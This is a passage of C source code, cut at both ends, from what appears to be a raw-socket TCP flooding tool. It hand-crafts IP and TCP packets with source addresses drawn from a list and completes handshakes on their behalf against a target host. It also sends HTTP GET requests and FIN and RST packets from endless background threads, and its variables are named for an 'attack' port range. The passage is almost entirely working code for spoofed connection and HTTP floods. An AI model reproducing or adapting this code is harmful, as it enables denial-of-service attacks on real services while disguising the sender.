                            isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, m_pAllUserStatus[iuserid].cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                            if(isendsize < 0)
                            {
                                printf("[CEpollClient error]: SendToServerData, send fail %d\n", isendsize);
                                DelEpoll(m_pAllUserStatus[iuserid].iSockFd);
                                CloseUser(m_pAllUserStatus[iuserid].iSockFd);
                                continue;
                            }
                        }
                    }
                    if(m_pAllUserStatus[iuserid].cSendSrcPort > attackEndPort)
                    {
                        struct http_status *item;
                        if((item = lookupHttp(sIpNum, m_pAllUserStatus[iuserid].cSendSrcPort)) == NULL)
                        {
                            //printf("___%s___%d___\n", m_pAllUserStatus[iuserid].cSendSrcIp, m_pAllUserStatus[iuserid].cSendSrcPort); 
                            update_syn_hash_table(sIpNum, m_pAllUserStatus[iuserid].cSendSrcPort, m_pAllUserStatus[iuserid].cSynSeq,  m_pAllUserStatus[iuserid].cSynAck, m_pAllUserStatus[iuserid].iSockFd, 1);
                            isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, m_pAllUserStatus[iuserid].cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                            if(isendsize < 0)
                            {
                                printf("[CEpollClient error]: SendToServerData, send fail %d\n", isendsize);
                                DelEpoll(m_pAllUserStatus[iuserid].iSockFd);
                                CloseUser(m_pAllUserStatus[iuserid].iSockFd);
                                continue;
                                //exit(1);
                            }			
                        }
                    }
                    event_nfds.events = EPOLLIN|EPOLLET;//EPOLLIN|EPOLLERR|EPOLLHUP;
                    event_nfds.data.fd = iclientsockfd;
                    epoll_ctl(m_iEpollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);
                    m_pAllUserStatus[iuserid].iUserStatus = SEND_OK;
                }
            }
            else if(events[ifd].events & EPOLLIN)//监听到读事件，接收数据  
            {
                char rcvbuf[1024] = "";
                struct sockaddr_in client;
                int len =  sizeof(client);
                if(SEND_OK == m_pAllUserStatus[iuserid].iUserStatus &&  m_pAllUserStatus[iuserid].iUserStatus >0)
                {
                    int irecvsize = recvfrom(m_pAllUserStatus[iuserid].iSockFd, rcvbuf, 1024, 0, (struct sockaddr *)&client, &len);
                    if(0 > irecvsize)
                    {
                        printf("[CEpollClient error]: iUserId: %d, recv from server fail\n", iuserid);
                        printf("[CEpollClient error]: RunFun, recv fail");
                        DelEpoll(events[ifd].data.fd);
                        CloseUser(events[ifd].data.fd);
                    }
                    else if(0 == irecvsize)
                    {
                        printf("[warning:] iUserId: %d, \n RecvFromServer, 数据为0，对方断开连接,irecvsize: %d, isockfd %d\n", iuserid, irecvsize, m_pAllUserStatus[iuserid].iSockFd);
                        DelEpoll(events[ifd].data.fd);
                        CloseUser(events[ifd].data.fd);
                       return 0;
                    }
                    else
                    {
                        int i, findIp = 0, ackForFin = 0;
                        char sourceIp[16] = "";
                        char destIp[16] = "";
                        struct sockaddr_in source, dest;
                        struct iphdr *ip1 = (struct iphdr *)(rcvbuf);
                        memset(&source, 0, sizeof(source));

                        source.sin_addr.s_addr = ip1->saddr;
                        memset(&dest, 0, sizeof(dest));
                        dest.sin_addr.s_addr = ip1->daddr;

                        strcpy(sourceIp, inet_ntoa(source.sin_addr));
                        strcpy(destIp, inet_ntoa(dest.sin_addr));

                        int iphdrlen1 = ip1->ihl*4;
                        struct tcphdr *tcpkt=(struct tcphdr*)(rcvbuf + iphdrlen1);

                        for(i=0;i<srcIpCount;i++)
                        {
                            if(!strncmp(srcIpBuf[i], destIp, strlen(srcIpBuf[i])))
                            {
                            findIp = 1;
                            }
                        }
                    if(findIp == 1 /*&& ntohs(tcpkt->dest) < attackEndPort)*/&& !strstr(sourceIp, "254"))
                    {
                        int iphdrlen1 = ip1->ihl*4;
                        int connectStatus = 0;
                                    struct tcphdr *tcpkt=(struct tcphdr*)(rcvbuf + iphdrlen1);    
                        struct iphdr *sendip;
                        struct tcphdr *sendtcp;

                        char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                        memset(cSendbuff, 0x0, sizeof(cSendbuff));
                        sendip = (struct iphdr *)cSendbuff;
                        sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                        sendip->ihl = 5;
                        sendip->version = 4;
                        sendip->tos = 0;
                        sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                        sendip->id = htonl(54321);
                        sendip->frag_off = 0;
                        sendip->ttl = 64;
                        sendip->protocol = IPPROTO_TCP;
                        sendip->check = 0;
                        sendip->saddr = inet_addr(destIp);
                        sendip->daddr = inet_addr(dstIpBuf);
                        sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                        sendtcp->source = tcpkt->dest;
                        sendtcp->dest = tcpkt->source;
                        sendtcp->seq = htonl(ntohl(tcpkt->ack_seq));
                        sendtcp->ack_seq = htonl(ntohl(tcpkt->seq)+1);
                        sendtcp->doff = 5;
                        sendtcp->fin = 0;
                        sendtcp->syn = 0;
                        sendtcp->rst=0;
                        sendtcp->psh=0;
                        sendtcp->ack=1;
                        sendtcp->urg=0;
                        sendtcp->window = htons (5840);
                        sendtcp->check = 0;
                        sendtcp->urg_ptr = 0;
                        char *pseudogram;
                        struct pseudo_header psh;
                        psh.source_address = inet_addr(destIp);
                        psh.dest_address = inet_addr(dstIpBuf); 
                        psh.placeholder = 0;
                        psh.protocol = IPPROTO_TCP;	
                        psh.tcp_length = htons(sizeof(struct tcphdr));

                        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                        pseudogram = malloc(psize);
                        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                        memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                        sendtcp->check = 0;
                        sendtcp->check = csum( (unsigned short*) pseudogram , psize);			

                        struct sockaddr_in addr;
                        memset( &addr, 0x0, sizeof(struct sockaddr_in));
                        addr.sin_family = AF_INET;
                        addr.sin_port = htons(d_iPort);
                        addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                        if (tcpkt->syn == 1 && tcpkt->ack == 1)
                        {
                            if(ntohs(tcpkt->dest) > attackEndPort)
                            {
                                struct http_status *item;
                                if((item = lookupHttp(inet_addr(destIp), ntohs(sendtcp->source))) != NULL)
                                {
                                    if(item->getFlag != 1)
                                    {
                                        update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pAllUserStatus[iuserid].iSockFd, 1);
                                        update_ack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pAllUserStatus[iuserid].iSockFd, 1);
                                        int isendsize = -1;
                                        isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                        if(isendsize < 0)
                                        {
                                            printf("======send tcp ack message failed======\n");
                                        }
                                        send_http_get_fun(m_pAllUserStatus[iuserid].iSockFd, inet_addr(destIp), inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq));
                                        update_httpget_hash_table(inet_addr(destIp), ntohs(sendtcp->source), 0);
                                        item->getFlag = 1;
                                    }
                                } 
                                else
                                {
                                    update_syn_hash_table(inet_addr(destIp), ntohs(sendtcp->source), m_pAllUserStatus[iuserid].cSynSeq, m_pAllUserStatus[iuserid].cSynAck, m_pAllUserStatus[iuserid].iSockFd, 1);
                                    update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pAllUserStatus[iuserid].iSockFd, 1);
                                    update_ack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pAllUserStatus[iuserid].iSockFd, 1);

                                    int isendsize = -1;
                                    isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                    if(isendsize < 0)
                                    {
                                        printf("======send http ack message failed======\n");
                                    }
                                    send_http_get_fun(m_pAllUserStatus[iuserid].iSockFd, inet_addr(destIp), inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq));
                                    update_httpget_hash_table(inet_addr(destIp), ntohs(sendtcp->source), 1);
                                }  
                            }
                            else
                            {	
                                struct tcp_status *item;
                                if((item = lookup(inet_addr(destIp), ntohs(sendtcp->source))) != NULL)
                                {
                                    if(item->synFlag == 1 && item->synAckFlag != 1)
                                    {
                                        update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pAllUserStatus[iuserid].iSockFd, 0);
                                        update_ack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pAllUserStatus[iuserid].iSockFd, 0);

                                        int isendsize = -1;
                                        isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                        if(isendsize < 0)
                                        {
                                                printf("======send tcp ack message failed======\n");
                                        }
                                    }
                                }
                                else
                                {
                                    update_syn_hash_table(inet_addr(destIp), ntohs(sendtcp->source), m_pAllUserStatus[iuserid].cSynSeq, m_pAllUserStatus[iuserid].cSynAck, m_pAllUserStatus[iuserid].iSockFd, 0);				    
                                    update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pAllUserStatus[iuserid].iSockFd, 0);
                                    update_ack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pAllUserStatus[iuserid].iSockFd, 0);

                                    int isendsize = -1;
                                    isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                    if(isendsize < 0)
                                    {
                                        printf("======send tcp ack message failed======\n");
                                    }
                                }
                            }
                        }
                        else if(tcpkt->fin == 1 && tcpkt->ack == 1)
                        {
                            struct tcp_status *item;
                            if((item = lookup(inet_addr(sourceIp), ntohs(sendtcp->source))) != NULL)
                            {
                                if(item->finFlag == 1 && item->sFinAckFlag ==0)
                                {
                                    item->sFinAckFlag = 1;
                                    item->cFinAckSeq = ntohl(sendtcp->seq);
                                    item->cFinAckAck = ntohl(sendtcp->ack_seq);
                                    recvFinAckPacketNum++;	
                                    item->sAckForFinFlag = 1;
                                    item->cFinBackAckSeq = ntohl(sendtcp->seq);
                                    item->cFinBackAckAck = ntohl(sendtcp->ack_seq);
                                    sendAckForFin++;
                                    int isendsize = -1;
                                    isendsize = sendto(m_pAllUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                    if(isendsize < 0)
                                    {
                                        printf("========================send fin ack message failed=================================\n");
                                    }
                                }
                            }
                        }
                        m_pAllUserStatus[iuserid].iUserStatus = RECV_OK;
                        m_iSockFd_UserId[iclientsockfd] = iuserid;
                        event_nfds.data.fd = iclientsockfd;
                        event_nfds.events = EPOLLOUT|EPOLLET;
                        epoll_ctl(m_iEpollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);
                    }
                }
            }
            }
        }
    }
}

void slave_check_thread(void *arg)
{
    while(1)
    {
        int i = 0;
        struct tcp_status *item = NULL;

        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_tcp_status_list[i];
            for(;item != NULL;item = item->next)
            {
                if(item->synFlag == 1)
                {
                    if(item->synAckFlag == 1 && item->ackFlag == 1)
                    {
                        if(finFlag == 1 && item->finFlag != 1)
                        {
                            item->finFlag = 1;
                            struct iphdr *sendip;
                            struct tcphdr *sendtcp;
                            char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                                    memset(cSendbuff, 0x0, sizeof(cSendbuff));
                            sendip = (struct iphdr *)cSendbuff;
                            sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                            sendip->ihl = 5;
                            sendip->version = 4;
                            sendip->tos = 0;
                            sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                            sendip->id = htonl(54321);
                            sendip->frag_off = 0;
                            sendip->ttl = 64;
                            sendip->protocol = IPPROTO_TCP;
                            sendip->check = 0;
                            sendip->saddr = item->ipaddr;
                            sendip->daddr = inet_addr(dstIpBuf);
                            sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                            sendtcp->source = htons(item->port);
                            sendtcp->dest = htons(d_iPort);
                            sendtcp->seq = htonl(item->cAckSeq);
                            sendtcp->ack_seq = htonl(item->cAckAck);
                            sendtcp->doff = 5;
                            sendtcp->fin = 1;
                            sendtcp->syn = 0;
                            sendtcp->rst = 0;
                            sendtcp->psh = 0;
                            sendtcp->ack = 1;
                            sendtcp->urg = 0;
                            sendtcp->window = htons (5840);
                            sendtcp->check = 0;
                            sendtcp->urg_ptr = 0;

                            char *pseudogram;
                            struct pseudo_header psh;
                            psh.source_address = item->ipaddr;
                            psh.dest_address = inet_addr(dstIpBuf);
                            psh.placeholder = 0;
                            psh.protocol = IPPROTO_TCP;
                            psh.tcp_length = htons(sizeof(struct tcphdr));

                            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                            pseudogram = malloc(psize);
                            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                            memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                            sendtcp->check = 0;
                            sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                            struct sockaddr_in addr;
                            memset( &addr, 0x0, sizeof(struct sockaddr_in));
                            addr.sin_family = AF_INET;
                            addr.sin_port = htons(d_iPort);
                            addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                            struct sockaddr_in source, dest;
                            memset(&source, 0, sizeof(source));
                            source.sin_addr.s_addr = sendip->saddr;
                            memset(&dest, 0, sizeof(dest));
                            dest.sin_addr.s_addr = sendip->daddr;
                            char sourceIp[16] = "";
                            char destIp[16] = "";
                            strcpy(sourceIp, inet_ntoa(source.sin_addr));
                            strcpy(destIp, inet_ntoa(dest.sin_addr));

                            sendFinPacketNum++;
                            int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                            if( isendsize < 0)
                            {
                                printf("send fin failed!!!!!!\n");
                            }
                        } 
                    }
                }
            }
        }    
    }
}

void slave_check_send_httpack_thread(void *arg)
{
    while(1)
    {
        int i = 0;
        struct http_status *item = NULL;

        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_http_status_list[i];
           for(;item != NULL;item = item->next)
            {
               if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag != 1 )
                {
                    struct iphdr *sendip;
                    struct tcphdr *sendtcp;
                    char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                    memset(cSendbuff, 0x0, sizeof(cSendbuff));
                    sendip = (struct iphdr *)cSendbuff;
                    sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                    sendip->ihl = 5;
                    sendip->version = 4;
                    sendip->tos = 0;
                    sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                    sendip->id = htonl(54321);
                    sendip->frag_off = 0;
                    sendip->ttl = 64;
                    sendip->protocol = IPPROTO_TCP;
                    sendip->saddr = item->ipaddr;
                    sendip->daddr = inet_addr(dstIpBuf);
                    sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                    sendtcp->source = htons(item->port);
                    sendtcp->dest = htons(d_iPort);
                    sendtcp->seq = htonl(item->cAckSeq);
                    sendtcp->ack_seq = htonl(item->cAckAck);
                    sendtcp->doff = 5;
                    sendtcp->fin = 0;
                    sendtcp->syn = 0;
                    sendtcp->rst = 0;
                    sendtcp->psh = 0;
                    sendtcp->ack = 1;
                    sendtcp->urg = 0;
                    sendtcp->window = htons (5840);
                    sendtcp->check = 0;
                    sendtcp->urg_ptr = 0;

                    char *pseudogram;
                    struct pseudo_header psh;
                    psh.source_address = item->ipaddr;
                    psh.dest_address = inet_addr(dstIpBuf);
                    psh.placeholder = 0;
                    psh.protocol = IPPROTO_TCP;
                    psh.tcp_length = htons(sizeof(struct tcphdr));

                    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                    pseudogram = malloc(psize);
                    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                    memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                    sendtcp->check = 0;
                    sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                    struct sockaddr_in addr;
                    memset( &addr, 0x0, sizeof(struct sockaddr_in));
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(d_iPort);
                    addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                    struct sockaddr_in source, dest;
                    memset(&source, 0, sizeof(source));
                    source.sin_addr.s_addr = sendip->saddr;
                    memset(&dest, 0, sizeof(dest));
                    dest.sin_addr.s_addr = sendip->daddr;
                    char sourceIp[16] = "";
                    char destIp[16] = "";
                    strcpy(sourceIp, inet_ntoa(source.sin_addr));
                    strcpy(destIp, inet_ntoa(dest.sin_addr));

                    update_ack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), item->socket, 1);
                    int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                    if( isendsize < 0)
                    {
                        printf("send http ack failed!!!!!!\n");
                    }
                }
            }
        }
    }
}


void slave_check_fin_thread(void *arg)
{
    while(1)
    {
        int i = 0;
        struct tcp_status *item = NULL;
        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_tcp_status_list[i];
            for(;item != NULL;item = item->next)
            {
                if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag == 1 && finFlag == 1 /*&& item->finFlag == 1 && item->sFinAckFlag == 1*/ && item->sAckForFinFlag == 0)
                {
                    item->sAckForFinFlag = 1;
                    struct iphdr *sendip;
                    struct tcphdr *sendtcp;
                    char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                    memset(cSendbuff, 0x0, sizeof(cSendbuff));
                    sendip = (struct iphdr *)cSendbuff;
                    sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                    sendip->ihl = 5;
                    sendip->version = 4;
                    sendip->tos = 0;
                    sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                    sendip->id = htonl(54321);
                    sendip->frag_off = 0;
                    sendip->ttl = 255;
                    sendip->protocol = IPPROTO_TCP;
                    sendip->check = 0;
                    sendip->saddr = item->ipaddr;
                    sendip->daddr = inet_addr(dstIpBuf);
                    sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                    sendtcp->source = htons(item->port);
                    sendtcp->dest = htons(d_iPort);
                    sendtcp->seq = htonl(item->cFinAckAck);
                    sendtcp->ack_seq = htonl(item->cFinAckSeq+1);
                    sendtcp->doff = 5;
                    sendtcp->fin = 0;
                    sendtcp->syn = 0;
                    sendtcp->rst = 0;
                    sendtcp->psh = 0;
                    sendtcp->ack = 1;
                    sendtcp->urg = 0;
                    sendtcp->window = htons (5840);
                    sendtcp->check = 0;
                    sendtcp->urg_ptr = 0;

                    char *pseudogram;
                    struct pseudo_header psh;
                    psh.source_address = item->ipaddr;
                    psh.dest_address = inet_addr(dstIpBuf);
                    psh.placeholder = 0;
                    psh.protocol = IPPROTO_TCP;
                    psh.tcp_length = htons(sizeof(struct tcphdr));

                    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                    pseudogram = malloc(psize);
                    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                    memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                    sendtcp->check = 0;
                    sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                    struct sockaddr_in addr;
                    memset( &addr, 0x0, sizeof(struct sockaddr_in));
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(d_iPort);
                    addr.sin_addr.s_addr = inet_addr(dstIpBuf);	

                    struct sockaddr_in source, dest;
                    memset(&source, 0, sizeof(source));
                    source.sin_addr.s_addr = sendip->saddr;
                    memset(&dest, 0, sizeof(dest));
                    dest.sin_addr.s_addr = sendip->daddr;
                    char sourceIp[16] = "";
                    char destIp[16] = "";
                    strcpy(sourceIp, inet_ntoa(source.sin_addr));
                    strcpy(destIp, inet_ntoa(dest.sin_addr));

                    //update_fin_backack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), item->socket);
                    sendAckForFin++;
                    int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                    if( isendsize < 0)
                    {
                        printf("send ack for fin failed!!!!!!\n");
                    }   
                }
            }
        }
    }
}

void slave_check_rst_thread(void *arg)
{
    while(1)
    {
        int i = 0;
        struct tcp_status *item = NULL;
        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_tcp_status_list[i];
            for(;item != NULL;item = item->next)
            {
                if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag == 1 && rstFlag == 1 && item->rstFlag != 1)//&& item->sFinAckFlag == 1 && item->sAckForFinFlag == 0)
                {
                    item->rstFlag = 1;
                    struct iphdr *sendip;
                    struct tcphdr *sendtcp;
                    char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                    memset(cSendbuff, 0x0, sizeof(cSendbuff));
                    sendip = (struct iphdr *)cSendbuff;
                    sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                    sendip->ihl = 5;
                    sendip->version = 4;
                    sendip->tos = 0;
                    sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                    sendip->id = htonl(54321);
                    sendip->frag_off = 0;
                    sendip->ttl = 255;
                    sendip->protocol = IPPROTO_TCP;
                    sendip->check = 0;
                    sendip->saddr = item->ipaddr;
                    sendip->daddr = inet_addr(dstIpBuf);
                    sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                    sendtcp->source = htons(item->port);
                    sendtcp->dest = htons(d_iPort);
                    sendtcp->seq = htonl(item->cAckAck);
                    sendtcp->ack_seq = 0;
                    sendtcp->doff = 5;
                    sendtcp->fin = 0;
                    sendtcp->syn = 0;
                    sendtcp->rst = 1;
                    sendtcp->psh = 0;
                    sendtcp->ack = 0;
                    sendtcp->urg = 0;
                    sendtcp->window = htons (5840);
                    sendtcp->check = 0;
                    sendtcp->urg_ptr = 0;

                    char *pseudogram;
                    struct pseudo_header psh;
                    psh.source_address = item->ipaddr;
                    psh.dest_address = inet_addr(dstIpBuf);
                    psh.placeholder = 0;
                    psh.protocol = IPPROTO_TCP;
                    psh.tcp_length = htons(sizeof(struct tcphdr));

                    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                    pseudogram = malloc(psize);
                    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                    memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                    sendtcp->check = 0;
                    sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                    struct sockaddr_in addr;
                    memset( &addr, 0x0, sizeof(struct sockaddr_in));
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(d_iPort);
                    addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                    struct sockaddr_in source, dest;
                    memset(&source, 0, sizeof(source));
                    memset(&dest, 0, sizeof(dest));

                    source.sin_addr.s_addr = sendip->saddr;
                    dest.sin_addr.s_addr = sendip->daddr;
                    char sourceIp[16] = "";
                    char destIp[16] = "";
                    strcpy(sourceIp, inet_ntoa(source.sin_addr));
                    strcpy(destIp, inet_ntoa(dest.sin_addr));
                    //update_fin_backack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), item->socket);
                    sendRstPacketNum++; 

                    int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                    if( isendsize < 0)
                    {
                        printf("send rst packet failed(iptables)!!!!!!\n");
                    }
                }
            }
        }
    }
}

void slave_check_recv_thread(void *arg)
{
    int num = (int *)arg;
    socketfd[num] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socketfd[num] < 0)
    {
        printf( "%s", strerror(errno));
        return;
    } 
    int opt = 1;
    int bufsize = 50 * 1024;
    int flag1 = setsockopt( socketfd[num], IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    int flag2 = setsockopt( socketfd[num], SOL_SOCKET, SO_RCVBUF,&bufsize,sizeof(bufsize));

    while(1)
    {
        char rcvbuf[1024] = "";
        struct sockaddr_in client;
        int len =  sizeof(client);
        int irecvsize = recvfrom(socketfd[num], rcvbuf, 1024, 0, (struct sockaddr *)&client, &len);
        if(0 > irecvsize)
        {
            close(socketfd[num]);
            exit(1);
        }
        int i, findIp = 0;
        char sourceIp[16] = "";
        char destIp[16] = "";
        struct sockaddr_in source, dest;
        struct iphdr *ip1 = (struct iphdr *)(rcvbuf);
        memset(&source, 0, sizeof(source));
        memset(&dest, 0, sizeof(dest));

        source.sin_addr.s_addr = ip1->saddr;
        dest.sin_addr.s_addr = ip1->daddr;
        strcpy(sourceIp, inet_ntoa(source.sin_addr));
        strcpy(destIp, inet_ntoa(dest.sin_addr));

        for(i=0;i<m_iUserCount;i++)
        {
            if(!strncmp(srcIpBuf[i], destIp, strlen(srcIpBuf[i])))
            {
                findIp = 1;
            }
        }
        if(findIp == 1 && !strstr(sourceIp, "254"))
        {
            int iphdrlen1 = ip1->ihl*4;
            struct tcphdr *tcpkt=(struct tcphdr*)(rcvbuf + iphdrlen1);

            struct iphdr *sendip;
            struct tcphdr *sendtcp;
            struct sockaddr_in addr;
            char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];

            if (tcpkt->syn == 1 && tcpkt->ack == 1 && ntohs(tcpkt->dest) < attackEndPort)
            {
                //char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                memset(cSendbuff, 0x0, sizeof(cSendbuff));
                sendip = (struct iphdr *)cSendbuff;
                sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                sendip->ihl = 5;
                sendip->version = 4;
                sendip->tos = 0;
                sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                sendip->id = htonl(54321);
                sendip->frag_off = 0;
                sendip->ttl = 64;
                sendip->protocol = IPPROTO_TCP;
                sendip->check = 0;
                sendip->saddr = ip1->daddr;//inet_addr(destIp);
                sendip->daddr = ip1->saddr;//inet_addr(sourceIp);
                sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                sendtcp->source = tcpkt->dest;
                sendtcp->dest = tcpkt->source;
                sendtcp->seq = htonl(ntohl(tcpkt->ack_seq));
                sendtcp->ack_seq = htonl(ntohl(tcpkt->seq)+1);
                sendtcp->doff = 5;
                sendtcp->syn = 0;
                sendtcp->rst=0;
                sendtcp->psh=0;
                sendtcp->ack=1;
                sendtcp->urg=0;
                sendtcp->window = htons (5840);
                sendtcp->check = 0;
                sendtcp->urg_ptr = 0;

                char *pseudogram;
                struct pseudo_header psh;
                psh.source_address = inet_addr(destIp);
                psh.dest_address = inet_addr(sourceIp);
                psh.placeholder = 0;
                psh.protocol = IPPROTO_TCP;
                psh.tcp_length = htons(sizeof(struct tcphdr));

                int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                sendtcp->check = 0;
                sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                memset( &addr, 0x0, sizeof(struct sockaddr_in));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(d_iPort);
                addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                struct sockaddr_in source, dest;
                memset(&source, 0, sizeof(source));
                memset(&dest, 0, sizeof(dest));

                source.sin_addr.s_addr = sendip->saddr;
                dest.sin_addr.s_addr = sendip->daddr;
                char sourceIp[16] = "";
                char destIp[16] = "";
                strcpy(sourceIp, inet_ntoa(source.sin_addr));
                strcpy(destIp, inet_ntoa(dest.sin_addr));

                struct tcp_status *item;
                if((item = lookup(inet_addr(sourceIp), ntohs(sendtcp->source))) != NULL)
                {
                    if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag != 1)
                    {
